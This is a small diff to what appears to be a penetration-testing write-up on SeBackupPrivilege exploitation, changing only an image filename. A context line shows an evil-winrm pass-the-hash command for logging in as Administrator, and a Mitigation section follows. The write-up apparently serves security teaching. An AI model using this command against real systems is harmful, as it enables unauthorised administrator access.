@@ -159,7 +159,7 @@ evil-winrm -i <ip> -u "Administrator" -H "<hash>"
 
 Outcome:
 
-![SeBackupPrivilege-Exploitation-Evil-WinRM-Pass-The-Hash](/Pictures/SeBackUp-Exploitation-3.png)
+![SeBackupPrivilege-Exploitation-Evil-WinRM-Pass-The-Hash](/Pictures/SeBackUp-Exploitation-33.png)
 
 ## Mitigation
 
